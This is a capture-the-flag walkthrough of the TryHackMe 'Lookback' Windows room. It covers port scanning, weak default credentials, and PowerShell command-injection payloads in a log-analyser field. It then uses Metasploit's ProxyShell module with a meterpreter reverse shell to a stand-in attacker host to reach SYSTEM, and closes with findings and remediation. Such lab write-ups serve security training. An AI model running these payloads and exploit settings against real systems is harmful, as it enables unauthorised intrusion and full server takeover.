# Lookback

You’ve been asked to run a vulnerability test on a production environment.

The Lookback company has just started the integration with Active Directory. Due to the coming deadline, the system integrator had to rush the deployment of the environment. Can you spot any vulnerabilities?

Start the Lab Machine by pressing the Start Lab Machine button at the top of this task. You may access the using the AttackBox or your connection. This machine does not respond to ping (ICMP).

Can you find all the flags?
The takes about 5/10 minutes to fully boot up.

Sometimes to move forward, we have to go backward.
So if you get stuck, try to look back!

Room: https://tryhackme.com/room/lookback

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/lookback.md

--------------------

## Overview

Lookback is a Windows and Microsoft Exchange room involving:

* IIS web enumeration
* Weak default credentials
* PowerShell command injection
* Information disclosure
* Microsoft Exchange ProxyShell
* Remote code execution as `NT AUTHORITY\SYSTEM`

Sensitive values have been partially obfuscated throughout this write-up.

---

## Enumeration

I began with a full TCP port scan:

```bash
sudo nmap -sV -sC -p- --min-rate 5000 \
  -oN nmap-sv-all.txt TARGET_IP
```

The scan returned:

```text
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
443/tcp  open  ssl/https
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

The HTTPS certificate revealed the hostname and domain:

```text
WIN-12OUO7A66M7
WIN-12OUO7A66M7.thm.local
```

I added the hostname to `/etc/hosts`:

```bash
echo 'TARGET_IP win-12ouo7a66m7.thm.local WIN-12OUO7A66M7' \
  | sudo tee -a /etc/hosts
```

I then tested Outlook Web Access:

```bash
curl -ki https://win-12ouo7a66m7.thm.local/owa/
```

The server redirected to the Exchange login page:

```text
HTTP/2 302
Location: /owa/auth/logon.aspx
```

The OWA source exposed the Exchange build family:

```bash
curl -ks https://win-12ouo7a66m7.thm.local/owa/auth/logon.aspx \
  | grep -oE '/owa/auth/[0-9.]+/' \
  | sort -u
```

```text
/owa/auth/15.2.858/
```

This identified the Exchange Server 2019 CU9 build family.

---

## Discovering the Hidden Log Analyser

Directory enumeration revealed a protected `/test/` endpoint.

Accessing it over HTTP returned `403 Forbidden`:

```bash
curl -i http://TARGET_IP/test/
```

```text
HTTP/1.1 403 Forbidden
```

Accessing the endpoint over HTTPS returned an authentication challenge:

```bash
curl -ki https://win-12ouo7a66m7.thm.local/test/
```

```text
HTTP/2 401
WWW-Authenticate: Basic realm="win-12ouo7a66m7.thm.local"
```

The application used weak default credentials:

```text
a****:a****
```

I authenticated and followed the redirect:

```bash
curl -ksL -u 'a****:a****' \
  https://win-12ouo7a66m7.thm.local/test/
```

The page source revealed the first flag directly:

```html
<span id="L_f">
THM{Secu...ense}
</span>
```

## Service Flag

```text
THM{Secu...ense}
```

The page also contained a log analyser:

```html
<input name="xlog"
       type="text"
       value="BitlockerActiveMonitoringLogs"
       id="xlog" />
```

The page included the warning:

```text
This interface should be removed on production!
```

---

## PowerShell Command Injection

The log analyser passed user-controlled input into a PowerShell command without securely validating or escaping it.

The original value was:

```text
BitlockerActiveMonitoringLogs
```

By closing the existing expression and appending another command, arbitrary PowerShell commands could be executed.

A basic test payload was:

```powershell
BitlockerActiveMonitoringLogs') | whoami #
```

This returned:

```text
thm\admin
```

This confirmed command execution as the domain user running the application.

A broader enumeration command could be used to locate interesting text files:

```powershell
BitlockerActiveMonitoringLogs') | Get-ChildItem C:\Users -Recurse -Force -File -Filter *.txt -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName #
```

The same vulnerability could also be used to retrieve file contents:

```powershell
BitlockerActiveMonitoringLogs') | Get-Content 'C:\path\to\file.txt' #
```

---

## User Enumeration

After gaining command execution, I enumerated the local user profiles:

```cmd
dir C:\Users
```

A user named `dev` was present.

The user flag was located at:

```text
C:\Users\dev\Desktop\user.txt
```

I read it with:

```cmd
type C:\Users\dev\Desktop\user.txt
```

## User Flag

```text
THM{Stop...Doing}
```

The same directory contained a useful note:

```cmd
type C:\Users\dev\Desktop\todo.txt
```

The important contents were:

```text
Promote Server to Domain Controller [DONE]
Setup Microsoft Exchange [DONE]
Setup IIS [DONE]
Remove the log analyzer [TO BE DONE]
Add all the users from the infra department [TO BE DONE]
Install the Security Update for MS Exchange [TO BE DONE]
Setup LAPS [TO BE DONE]
```

The note also included several organisation email addresses:

```text
j**@thm.local
c****@thm.local
d***********************@thm.local
```

The most important clue was:

```text
Install the Security Update for MS Exchange [TO BE DONE]
```

This suggested that the Exchange server had not been patched against known vulnerabilities.

---

## Exchange Enumeration

Several Microsoft Exchange endpoints were accessible:

```bash
curl -ksI \
  https://win-12ouo7a66m7.thm.local/EWS/Exchange.asmx

curl -ksI \
  https://win-12ouo7a66m7.thm.local/autodiscover/autodiscover.xml

curl -ksI \
  https://win-12ouo7a66m7.thm.local/Microsoft-Server-ActiveSync
```

The responses showed support for several authentication mechanisms:

```text
Negotiate
NTLM
Basic
```

I then searched Metasploit for Exchange-related modules:

```bash
msfconsole -q
```

```text
search exchange proxyshell
```

The relevant module was:

```text
exploit/windows/http/exchange_proxyshell_rce
```

ProxyShell combines several vulnerabilities:

```text
CVE-2021-34473
CVE-2021-34523
CVE-2021-31207
```

---

## Testing for ProxyShell

I selected the module:

```text
use exploit/windows/http/exchange_proxyshell_rce
```

Then configured the target:

```text
set RHOSTS TARGET_IP
set RPORT 443
set SSL true
set VHOST win-12ouo7a66m7.thm.local
```

I ran the built-in vulnerability check:

```text
check
```

The result confirmed that the Exchange server was vulnerable:

```text
[+] TARGET_IP:443 - The target is vulnerable.
```

---

## Initial Exploitation Attempt

The module first attempted to enumerate valid mailboxes automatically:

```text
[*] Enumerating valid email addresses and searching for one that either has the
    'Mailbox Import Export' role or can self-assign it
```

However, it returned:

```text
[*] Enumerated 0 email addresses
[-] No user with the necessary management role was identified
```

The module supports manually supplying a known email address through the `EMAIL` option.

The intended route was to use one of the email addresses discovered in `todo.txt`.

During testing, I used:

```text
a************@thm.local
```

---

## ProxyShell Exploitation

I configured the module:

```text
set EMAIL a************@thm.local
set TARGET 0
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
set HttpClientTimeout 120
set WfsDelay 20
set VERBOSE true
```

Then executed it:

```text
run
```

The module retrieved the backend Exchange server name:

```text
win-12ouo7a66m7.thm.local
```

It also resolved the mailbox SID:

```text
S-1-5-21-**********-**********-**********-500
```

The module assigned the `Mailbox Import Export` role:

```text
[+] Successfully assigned the 'Mailbox Import Export' role
```

It then saved a draft email containing an embedded web shell and exported the attachment into the OWA authentication directory.

The write location was similar to:

```text
C:\Program Files\Microsoft\Exchange Server\V15\
FrontEnd\HttpProxy\owa\auth\<random>.aspx
```

The mailbox export completed successfully:

```text
[+] The mailbox export request has completed
```

The module then triggered the payload:

```text
[*] Triggering the payload
[*] Sending stage to TARGET_IP
```

A Meterpreter session opened:

```text
[*] Meterpreter session 1 opened
```

The module also attempted to clean up the temporary artifacts:

```text
Deleted temporary ASPX web shell
Removed mailbox export request
Removed draft email
```

---

## SYSTEM Access

Inside Meterpreter, I opened a Windows command shell:

```text
shell
```

I checked the current user:

```cmd
whoami
```

The result was:

```text
nt authority\system
```

This confirmed full compromise of the Exchange server.

---

## Administrator Flag

I searched the Administrator profile and found the final flag at:

```text
C:\Users\Administrator\Documents\flag.txt
```

I read it using:

```cmd
type C:\Users\Administrator\Documents\flag.txt
```

## Administrator Flag

```text
THM{Look...Bad}
```

---

## Flags

```text
Service Flag:
THM{Secu...ense}

User Flag:
THM{Stop...Doing}

Administrator Flag:
THM{Look...Bad}
```

---

## Attack Chain

```text
Full TCP port scan
        ↓
Discover IIS, OWA and RDP
        ↓
Extract hostname from TLS certificate
        ↓
Add hostname to /etc/hosts
        ↓
Identify Exchange Server 2019 CU9 build family
        ↓
Discover HTTPS /test/ endpoint
        ↓
Authenticate using weak default credentials
        ↓
Recover service flag
        ↓
Exploit PowerShell command injection
        ↓
Enumerate dev user's Desktop
        ↓
Recover user flag and todo.txt
        ↓
Identify unpatched Exchange installation
        ↓
Obtain valid organisation email addresses
        ↓
Confirm ProxyShell vulnerability
        ↓
Supply a valid mailbox manually
        ↓
Assign Mailbox Import Export role
        ↓
Export embedded ASPX web shell
        ↓
Trigger reverse Meterpreter payload
        ↓
Obtain NT AUTHORITY\SYSTEM
        ↓
Recover administrator flag
```

---

## Key Findings

### Weak Default Credentials

The `/test/` endpoint was protected using Basic authentication but accepted weak default credentials.

```text
a****:a****
```

### Exposed Administrative Interface

The application openly warned:

```text
This interface should be removed on production!
```

Despite this, it remained publicly reachable.

### PowerShell Command Injection

The log analyser inserted user-controlled input into a PowerShell command without proper validation or escaping.

This allowed arbitrary command execution.

### Sensitive Information Disclosure

The `todo.txt` file disclosed:

* Internal administrative tasks
* The fact that Exchange security updates had not been installed
* Valid internal email addresses
* The absence of LAPS
* The existence of an unfinished infrastructure user rollout

### Unpatched Microsoft Exchange

The Exchange Server 2019 CU9 installation remained vulnerable to ProxyShell.

### SYSTEM-Level Compromise

Successful exploitation resulted in:

```text
NT AUTHORITY\SYSTEM
```

This gave complete control over the server.

---

## Remediation

The following actions would prevent this attack chain:

1. Remove unused administrative and diagnostic interfaces from production.

2. Replace default credentials with strong, unique passwords.

3. Disable Basic authentication where it is not required.

4. Validate and safely handle all user-controlled input.

5. Avoid dynamically constructing PowerShell commands from raw web input.

6. Install Microsoft Exchange security updates promptly.

7. Remove sensitive operational notes from user-accessible directories.

8. Implement LAPS or Windows LAPS for local administrator passwords.

9. Limit Exchange administrative roles and audit role assignments.

10. Monitor for suspicious mailbox export requests and unexpected ASPX files under OWA directories.

11. Restrict access to management interfaces using network segmentation.

12. Regularly scan externally exposed services for known vulnerabilities.

---

## Notes

During testing, ProxyShell was identified before completing the intended `/test/` application path.

A guessed Administrator mailbox was accepted by the Metasploit module and resulted in SYSTEM access.

This was still the intended final vulnerability, but it skipped the room's intended discovery sequence.

The intended sequence was:

```text
/test/
→ weak credentials
→ PowerShell command injection
→ user flag
→ todo.txt
→ valid internal email addresses
→ unpatched Exchange clue
→ ProxyShell
→ SYSTEM
```
